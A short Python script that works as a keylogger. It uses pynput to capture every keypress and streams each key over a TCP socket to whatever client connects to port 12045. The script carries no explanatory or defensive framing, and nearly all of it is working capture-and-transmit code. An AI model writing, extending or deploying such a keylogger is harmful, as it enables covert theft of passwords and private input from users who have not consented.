import socket
import threading

from pynput.keyboard import Key, Listener

HOST = '127.0.0.1'
PORT = 12045
global conn

def key_press(key):
	k = str(key)
	k = k.replace("'", "")
	conn.sendall(bytes(k, "ascii"))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	s.bind((HOST,PORT))
	s.listen()

	conn, addr = s.accept()
	listener = Listener(on_press=key_press)
	listener.start()
	with conn:
		print('Connected by, ', addr)
		while True:
			data = conn.recv(1024)
			if not data:
				break

